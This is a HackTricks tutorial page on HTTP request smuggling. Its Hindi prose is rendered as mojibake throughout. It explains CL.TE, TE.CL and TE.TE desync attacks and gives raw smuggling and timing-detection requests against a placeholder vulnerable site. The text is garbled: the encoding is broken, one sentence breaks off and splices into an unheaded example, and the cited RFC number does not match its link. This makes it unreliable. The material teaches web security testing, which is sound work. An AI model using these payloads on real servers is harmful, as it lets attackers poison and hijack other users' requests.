# HTTP Request Smuggling / HTTP Desync Attack

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>

## рдХреНрдпрд╛ рд╣реИ

рдпрд╣ рднреЗрджреНрдпрддрд╛ рддрдм рд╣реЛрддреА рд╣реИ рдЬрдм **front-end proxies** рдФрд░ **back-end** рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ **рдЕрд╕рдордиреНрд╡рдпрди** рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** рдХреЛ HTTP **request** рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ **front-end** proxies (load balance/reverse-proxy) рджреНрд╡рд╛рд░рд╛ **рдПрдХрд▓ request** рдХреЗ рд░реВрдк рдореЗрдВ рдФрд░ **back-end** рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ **2 request** рдХреЗ рд░реВрдк рдореЗрдВ **рд╡реНрдпрд╛рдЦреНрдпрд╛** рдХреА рдЬрд╛рдПрдЧреАред\
рдЗрд╕рд╕реЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **back-end рд╕рд░реНрд╡рд░ рдкрд░ рдЕрдкрдиреЗ рдмрд╛рдж рдЖрдиреЗ рд╡рд╛рд▓реЗ рдЕрдЧрд▓реЗ request рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ**ред

### рд╕рд┐рджреНрдзрд╛рдВрдд

[**RFC рд╡рд┐рдирд┐рд░реНрджреЗрд╢ (2161)**](https://tools.ietf.org/html/rfc2616)

> рдпрджрд┐ рдХреЛрдИ рд╕рдВрджреЗрд╢ Transfer-Encoding рд╣реЗрдбрд░ рдлреАрд▓реНрдб рдФрд░ Content-Length рд╣реЗрдбрд░ рдлреАрд▓реНрдб рджреЛрдиреЛрдВ рдХреЗ рд╕рд╛рде рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдмрд╛рдж рд╡рд╛рд▓реЗ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

**Content-Length**

> Content-Length рдЗрдХрд╛рдИ рд╣реЗрдбрд░ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдХреЛ рднреЗрдЬреЗ рдЧрдП рдЗрдХрд╛рдИ-рд╢рд░реАрд░ рдХреЗ рдЖрдХрд╛рд░ рдХреЛ рдмрд╛рдЗрдЯреНрд╕ рдореЗрдВ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред

**Transfer-Encoding: chunked**

> Transfer-Encoding рд╣реЗрдбрд░ рдкреЗрд▓реЛрдб рд╢рд░реАрд░ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рддрдХ рдкрд╣реБрдБрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреБрдХреНрдд рдПрдиреНрдХреЛрдбрд┐рдВрдЧ рдХреЗ рд░реВрдк рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред\
> Chunked рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдмрдбрд╝реЗ рдбреЗрдЯрд╛ рдХреЛ рдПрдХ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдореЗрдВ рдЪрдВрдХреНрд╕ рдХреЗ рд░реВрдк рдореЗрдВ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ

### рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛

**Front-End** (рдПрдХ load-balance / Reverse Proxy) _**content-length**_ рдпрд╛ _**transfer-encoding**_ рд╣реЗрдбрд░ рдХреЛ **рдкреНрд░реЛрд╕реЗрд╕** рдХрд░рддрд╛ рд╣реИ рдФрд░ **Back-end** рд╕рд░реНрд╡рд░ **рджреВрд╕рд░реЗ** рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рджреЛрдиреЛрдВ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рдмреАрдЪ **рдЕрд╕рдордиреНрд╡рдпрди** рд╣реЛрддрд╛ рд╣реИред\
рдпрд╣ рдмрд╣реБрдд рдЧрдВрднреАрд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдРрд╕рд╛ request рднреЗрдЬрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛** рдЬрд┐рд╕реЗ reverse proxy рджреНрд╡рд╛рд░рд╛ **рд╡реНрдпрд╛рдЦреНрдпрд╛** рдХреА рдЬрд╛рдПрдЧреА рдФрд░ **back-end** рд╕рд░реНрд╡рд░ рдЗрд╕реЗ **2 рдЕрд▓рдЧ-рдЕрд▓рдЧ requests** рдХреЗ рд░реВрдк рдореЗрдВ **рд╕рдордЭреЗрдЧрд╛**ред рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ **рдЦрддрд░рд╛** рдЗрд╕ рддрдереНрдп рдореЗрдВ рдирд┐рд╣рд┐рдд рд╣реИ рдХрд┐ **back-end** рд╕рд░реНрд╡рд░ **2nd request рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдП рдЧрдП** рдХреЗ рд░реВрдк рдореЗрдВ **рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд░реЗрдЧрд╛** рдЬреИрд╕реЗ рдХрд┐ рдпрд╣ **рдЕрдЧрд▓реЗ рдЧреНрд░рд╛рд╣рдХ рд╕реЗ рдЖрдпрд╛ рд╣реЛ** рдФрд░ **рд╡рд╛рд╕реНрддрд╡рд┐рдХ request** рдЙрд╕ рдЧреНрд░рд╛рд╣рдХ рдХреА **рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдП рдЧрдП request рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛** рд╣реЛрдЧреАред

### рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ

рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ HTTP рдореЗрдВ **рдирдИ рд▓рд╛рдЗрди рдЪрд░рд┐рддреНрд░ 2 рдмрд╛рдЗрдЯреНрд╕ рд╕реЗ рдмрдирд╛ рд╣реЛрддрд╛ рд╣реИ:**

* **Content-Length**: рдпрд╣ рд╣реЗрдбрд░ рдПрдХ **рджрд╢рдорд▓рд╡ рд╕рдВрдЦреНрдпрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ request рдХреЗ **рд╢рд░реАрд░** рдХреЗ **рдмрд╛рдЗрдЯреНрд╕** рдХреА **рд╕рдВрдЦреНрдпрд╛** рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред рд╢рд░реАрд░ рдХрд╛ рдЕрдВрдд рдЕрдВрддрд┐рдо рдЪрд░рд┐рддреНрд░ рдореЗрдВ рд╣реЛрдиреЗ рдХреА рдЙрдореНрдореАрдж рд╣реИ, **request рдХреЗ рдЕрдВрдд рдореЗрдВ рдирдИ рд▓рд╛рдЗрди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА**ред
* **Transfer-Encoding:** рдпрд╣ рд╣реЗрдбрд░ **рд╢рд░реАрд░** рдореЗрдВ рдПрдХ **рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ рд╕рдВрдЦреНрдпрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ **рдЕрдЧрд▓реЗ рдЪрдВрдХ** рдХреЗ **рдмрд╛рдЗрдЯреНрд╕** рдХреА **рд╕рдВрдЦреНрдпрд╛** рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред **рдЪрдВрдХ** рдХреЛ **рдирдИ рд▓рд╛рдЗрди** рдХреЗ рд╕рд╛рде **рд╕рдорд╛рдкреНрдд** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рд▓реЗрдХрд┐рди рдпрд╣ рдирдИ рд▓рд╛рдЗрди рд▓рдВрдмрд╛рдИ рд╕рдВрдХреЗрддрдХ рджреНрд╡рд╛рд░рд╛ **рдЧрд┐рдиреА рдирд╣реАрдВ рдЬрд╛рддреА** рд╣реИред рдЗрд╕ рдЯреНрд░рд╛рдВрд╕рдлрд░ рд╡рд┐рдзрд┐ рдХрд╛ рдЕрдВрдд **рдЖрдХрд╛рд░ 0 рдХреЗ рдЪрдВрдХ рдХреЗ рд╕рд╛рде рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рдХреЗ рдмрд╛рдж 2 рдирдИ рд▓рд╛рдЗрдиреЗрдВ рд╣реЛрдВ**: `0`
* **Connection**: рдореЗрд░реЗ рдЕрдиреБрднрд╡ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, request Smuggling рдХреЗ рдкрд╣рд▓реЗ request рдореЗрдВ **`Connection: keep-alive`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред

## рдореВрд▓ рдЙрджрд╛рд╣рд░рдг

рддреЛ, request smuggling рд╣рдорд▓реЗ рдПрдХ рд╣реА HTTP request рдореЗрдВ `Content-Length` рд╣реЗрдбрд░ рдФрд░ `Transfer-Encoding` рд╣реЗрдбрд░ рджреЛрдиреЛрдВ рдХреЛ рд░рдЦрдиреЗ рдФрд░ рдЗрдиреНрд╣реЗрдВ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдореИрдирд┐рдкреБрд▓реЗрдЯ рдХрд░рдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рддрд╛рдХрд┐ front-end рдФрд░ back-end рд╕рд░реНрд╡рд░ рдЕрд▓рдЧ-рдЕрд▓рдЧ рддрд░реАрдХреЗ рд╕реЗ request рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░реЗрдВред рдЗрд╕реЗ рдХрд┐рд╕ рддрд░рд╣ рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╣ рджреЛрдиреЛрдВ рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ:

* **CL.TE**: front-end рд╕рд░реНрд╡рд░ `Content-Length` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ back-end рд╕рд░реНрд╡рд░ `Transfer-Encoding` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
* **TE.CL**: front-end рд╕рд░реНрд╡рд░ `Transfer-Encoding` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ back-end рд╕рд░реНрд╡рд░ `Content-Length` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
* **TE.TE**: front-end рдФрд░ back-end рд╕рд░реНрд╡рд░ рджреЛрдиреЛрдВ `Transfer-Encoding` рд╣реЗрдбрд░ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рд╕рд░реНрд╡рд░реЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рдХреЛ рд╣реЗрдбрд░ рдХреЛ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рдЕрд╕реНрдкрд╖реНрдЯ рдХрд░рдХреЗ рдкреНрд░реЛрд╕реЗрд╕ рдирд╣реАрдВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЗрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### CL.TE рднреЗрджреНрдпрддрд╛рдПрдБ

рдпрд╣рд╛рдБ, **front-end** рд╕рд░реНрд╡рд░ **`Content-Length`** рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ **back-end** рд╕рд░реНрд╡рд░ **`Transfer-Encoding`** рд╣реЗрдбрд░ рдХрд╛ред рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╕рд░рд▓ HTTP request smuggling рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ `Content-Length` рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ **рдмреЙрдбреАрдЬрд╝ request рдХреА рд▓рдВрдмрд╛рдИ 30 рдмрд╛рдЗрдЯреНрд╕ рд▓рдВрдмреА рд╣реИ** (_рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ HTTP рдирдИ рд▓рд╛рдЗрди рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдкреНрд░рддреНрдпреЗрдХ рдирдИ рд▓рд╛рдЗрди 2рдмрд╛рдЗрдЯреНрд╕_), рдЗрд╕рд▓рд┐рдП reverse proxy **рдкреВрд░рд╛ request back-end рдХреЛ рднреЗрдЬ рджреЗрдЧрд╛**, рдФрд░ back-end `Transfer-Encoding` рд╣реЗрдбрд░ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░реЗрдЧрд╛ рдЬрд┐рд╕рд╕реЗ `GET /404 HTTP/1.1` **рдЕрдЧрд▓реЗ request рдХреА рд╢реБрд░реБрдЖрдд рдХреЗ рд░реВрдк рдореЗрдВ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛** (рд╡реИрд╕реЗ, рдЕрдЧрд▓рд╛ request `Foo:x<Next request starts here>` рд╕реЗ рдЬреБрдбрд╝рд╛ рд╣реЛрдЧрд╛)ред

### TE.CL рднреЗрджреНрдпрддрд╛рдПрдБ

рдпрд╣рд╛рдБ, front-end рд╕рд░реНрд╡рд░ `Transfer-Encoding` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ back-end рд╕рд░реНрд╡рд░ `Content-Length` рд╣реЗрдбрд░ рдХрд╛ред рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╕рд░рд▓ HTTP request smuggling рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ **reverse-proxy** **рдкреВрд░рд╛ request back-end рдХреЛ рднреЗрдЬ рджреЗрдЧрд╛** рдХреНрдпреЛрдВрдХрд┐ **`Transfer-encoding`** рдРрд╕рд╛ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИред рд▓реЗрдХрд┐рди, **back-end** рдХреЗрд╡рд▓ **`7b`** (4рдмрд╛рдЗрдЯреНрд╕) рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░реЗрдЧрд╛ рдЬреИрд╕рд╛ рдХрд┐ `Content-Length` рдореЗрдВ рдЗрдВрдЧрд┐рдд рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд▓рд╛ request рд╡рд╣ рд╣реЛрдЧрд╛ рдЬреЛ `GET /404 HTTP/1.1` рд╕реЗ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИред

_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рднрд▓реЗ рд╣реА рд╣рдорд▓рд╛ `0` рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЕрдЧрд▓рд╛ request **x** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд рдорд╛рдиреЛрдВ рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛ред_\
_рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдореНрдмреЗрдбреЗрдб request рдХрд╛ Content-Length рдЕрдЧрд▓реЗ request рдХреА рд▓рдВрдмрд╛рдИ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░реЗрдЧ
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
рдЪреВрдВрдХрд┐ рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Content-Length` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдпрд╣ рдХреЗрд╡рд▓ рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ рдПрдХ рд╣рд┐рд╕реНрд╕рд╛ рдЖрдЧреЗ рднреЗрдЬреЗрдЧрд╛, `0` рдХреЛ рдЫреЛрдбрд╝рдХрд░ред рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Transfer-Encoding` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдкрд╣рд▓реЗ рдЪрдВрдХ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдлрд┐рд░ рдЕрдЧрд▓реЗ рдЪрдВрдХ рдХреЗ рдЖрдиреЗ рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рдПрдХ рдкрд░рд┐рд▓рдХреНрд╖рд┐рдд рд╕рдордп рджреЗрд░реА рд╣реЛрдЧреАред

рдХрднреА-рдХрднреА, рдЖрдкрдХреЛ рдЯрд╛рдЗрдордЖрдЙрдЯ рдХреЗ рдмрдЬрд╛рдп рдЕрдВрддрд┐рдо рд╣реЛрд╕реНрдЯ рд╕реЗ 400 рдмреИрдб рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдорд┐рд▓рддреА рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ, рдЬрд╣рд╛рдВ рдПрдХ CL.TE рдкреЗрд▓реЛрдб рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ:

![](<../../.gitbook/assets/image (444).png>)

рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдПрдХ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╢рд░реАрд░ рдХреЗ рдЕрдВрджрд░ рдПрдХ рддреНрд░реБрдЯрд┐ рд╣реЛрддреА рд╣реИ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ haproxy рдХрд╛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╕рдВрд╕реНрдХрд░рдг рднреА рд╣реЛрддрд╛ рд╣реИ:

![](<../../.gitbook/assets/image (443).png>)

### TE.CL рднреЗрджреНрдпрддрд╛рдУрдВ рдХреЛ рд╕рдордп рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЦреЛрдЬрдирд╛

рдпрджрд┐ рдХреЛрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди TE.CL рд╡реЗрд░рд┐рдПрдВрдЯ рдХреЗ рдЕрдиреБрд░реЛрдз рддрд╕реНрдХрд░реА рдХреЗ рд▓рд┐рдП рднреЗрджреНрдп рд╣реИ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕рд╛ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рд╕реЗ рдЕрдХреНрд╕рд░ рд╕рдордп рджреЗрд░реА рд╣реЛрдЧреА:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
### HTTP Request Smuggling рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ **рд╕рдордп рддрдХрдиреАрдХреЗрдВ рдХрд╛рдо рдХрд░ рд░рд╣реА рд╣реИрдВ**, рдЖрдкрдХреЛ **рдЬрд╛рдВрдЪ** рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдХрд┐ рдЖрдк **рдЕрдиреНрдп рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдЗрд╕реЗ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╡рд┐рд╖рд╛рдХреНрдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдирд╛ рд╣реИ, **рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `/` рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рдПрдХ 404 рд╡рд╛рдкрд╕ рдХрд░реЗрдВ**ред\
[рдореВрд▓ рдЙрджрд╛рд╣рд░рдгреЛрдВ](./#basic-examples) рдореЗрдВ рд╣рдордиреЗ рдкрд╣рд▓реЗ рд╣реА `CL.TE` рдФрд░ `TE.CL` рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗ рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ рдПрдХ рдЧреНрд░рд╛рд╣рдХ рдХреЗ рдЕрдиреБрд░реЛрдз рдХреЛ рд╡рд┐рд╖рд╛рдХреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `/404` рдорд╛рдВрдЧрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрдм рдЧреНрд░рд╛рд╣рдХ рдХрд┐рд╕реА рдЕрдиреНрдп рд╕рдВрд╕рд╛рдзрди рдХреЗ рд▓рд┐рдП рдкреВрдЫ рд░рд╣рд╛ рд╣реЛ рддреЛ 404 рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ред

**рдиреЛрдЯреНрд╕**

рдЕрдиреНрдп рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд╕рд╛рде рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛рдУрдВ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╕рдордп рдХреБрдЫ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╡рд┐рдЪрд╛рд░реЛрдВ рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП:

* "рд╣рдорд▓рд╛" рдЕрдиреБрд░реЛрдз рдФрд░ "рд╕рд╛рдорд╛рдиреНрдп" рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдиреЗрдЯрд╡рд░реНрдХ рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд░реНрд╡рд░ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рджреЛрдиреЛрдВ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдПрдХ рд╣реА рдХрдиреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬрдиреЗ рд╕реЗ рдпрд╣ рд╕рд╛рдмрд┐рдд рдирд╣реАрдВ рд╣реЛрдЧрд╛ рдХрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдореМрдЬреВрдж рд╣реИред
